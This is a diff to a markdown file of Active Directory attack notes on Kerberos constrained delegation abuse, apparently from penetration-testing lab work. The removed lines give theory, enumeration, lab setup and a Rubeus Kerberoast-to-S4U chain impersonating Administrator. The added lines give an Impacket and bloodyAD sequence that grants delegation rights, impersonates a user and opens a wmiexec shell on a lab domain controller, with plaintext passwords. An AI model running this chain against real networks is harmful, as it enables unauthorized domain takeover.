@@ -91,77 +91,23 @@ Import-Module .\PowerView.ps1
 
 ## 3. Constrained Delegation with Protocol Transition (S4U2Self + S4U2Proxy)
 
-### 3.1 Theory
-
-A service account flagged `TRUSTED_TO_AUTH_FOR_DELEGATION` (`userAccountControl` bit `0x1000000`, "Use any authentication protocol" in the GUI) can use **S4U2Self** to request a service ticket *to itself* on behalf of any user — even one who never authenticated to it — without knowing that user's credentials. It then uses **S4U2Proxy** to exchange that ticket for one to any SPN listed in its `msDS-AllowedToDelegateTo` attribute. If an attacker compromises this account's credentials (e.g. via Kerberoasting), they can impersonate any user, including Domain Admins, against the allowed target services.
-
-### 3.2 Enumeration
-
-```powershell
-Import-Module .\PowerView.ps1
-
-# PowerView - accounts with Protocol Transition + delegation targets
-Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
-Get-DomainComputer -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
-
-# Native AD module
-Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties TrustedToAuthForDelegation, msDS-AllowedToDelegateTo, ServicePrincipalName
-Get-ADComputer -Filter {TrustedToAuthForDelegation -eq $true} -Properties TrustedToAuthForDelegation, msDS-AllowedToDelegateTo
 ```
+python3 /home/sako/Tools/Impacket/examples/getTGT.py redelegate.vl/'FS01$':'sako2005!' -dc-ip 10.129.30.71
+export KRB5CCNAME=FS01\$.ccache
+klist
 
-This checks for both the `TRUSTED_TO_AUTH_FOR_DELEGATION` bit and a populated `msDS-AllowedToDelegateTo` list. Any matching account is a high-value target: compromising its credentials grants impersonation rights over whatever SPNs it's allowed to delegate to.
+python3 /home/sako/Tools/bloodyAD/bloodyAD.py -d redelegate.vl -u helen.frost -p 'sako2005!' --host dc.redelegate.vl add uac 'FS01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
 
-### 3.3 Lab Setup
+python3 /home/sako/Tools/bloodyAD/bloodyAD.py -d redelegate.vl -u helen.frost -p 'sako2005!' --host dc.redelegate.vl set object 'FS01$' msDS-AllowedToDelegateTo -v 'cifs/dc.redelegate.vl' -v 'ldap/dc.redelegate.vl'
 
-```powershell
-Import-Module ActiveDirectory
+python3 /home/sako/Tools/bloodyAD/bloodyAD.py -d redelegate.vl -u helen.frost -p 'sako2005!' --host dc.redelegate.vl get object 'FS01$' --attr msDS-AllowedToDelegateTo
+python3 /home/sako/Tools/bloodyAD/bloodyAD.py -d redelegate.vl -u helen.frost -p 'sako2005!' --host dc.redelegate.vl get object RYAN.COOPER --attr userAccountControl
 
-# Create service account
-New-ADUser -Name "unconstrained-svc" -SAMAccountName "unconstrained-svc" `
-    -AccountPassword (ConvertTo-SecureString "sako2005!" -AsPlainText -Force) `
-    -Enabled $true -PasswordNeverExpires $true
+python3 /home/sako/Tools/Impacket/examples/getST.py -spn cifs/dc.redelegate.vl -impersonate ryan.cooper redelegate.vl/'FS01$':'sako2005!' -dc-ip 10.129.30.71
 
-# Set SPN
-setspn -A HTTP/unconstrained-svc.warzone.oxsium.local unconstrained-svc
-
-# Enable Constrained Delegation + Protocol Transition
-Set-ADAccountControl -Identity "unconstrained-svc" -TrustedToAuthForDelegation $true
-Set-ADUser -Identity "unconstrained-svc" -Add @{
-    'msDS-AllowedToDelegateTo' = @("CIFS/WIN-WARZONE.warzone.oxsium.local","HTTP/WIN-WARZONE.warzone.oxsium.local")
-}
-
-# Check
-Get-ADUser -Identity "unconstrained-svc" -Properties TrustedToAuthForDelegation, msDS-AllowedToDelegateTo, ServicePrincipalName
+export KRB5CCNAME=ryan.cooper.ccache
+python3 /home/sako/Tools/Impacket/examples/wmiexec.py -k -no-pass dc.redelegate.vl
 ```
-
-### 3.4 Attack Chain (via Kerberoasting)
-
-```powershell
-Import-Module .\PowerView.ps1
-
-# Find SPN-enabled accounts
-Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
-
-# Kerberoast the target account
-.\Rubeus.exe kerberoast /user:unconstrained-svc /outfile:hashes.txt
-
-# Crack the hash offline
-hashcat -m 13100 hashes.txt rockyou.txt
-
-# If a plaintext password was recovered, convert it to an NTLM hash
-.\Rubeus.exe hash /password:sako2005! /user:unconstrained-svc /domain:warzone.oxsium.local
-
-# Full S4U chain: impersonate Administrator, delegate to CIFS on the DC, inject ticket
-.\Rubeus.exe s4u /user:unconstrained-svc /rc4:BURAYA_RC4_HASH `
-    /impersonateuser:Administrator `
-    /msdsspn:CIFS/WIN-WARZONE.warzone.oxsium.local `
-    /ptt
-
-# Verify access
-ls \\WIN-WARZONE.warzone.oxsium.local\C$
-```
-
-**Note:** Rubeus's `s4u` action does not accept `/password` — only `/rc4` or `/aes256`. Convert the password to a hash first with `Rubeus.exe hash`.
 
 ---
 
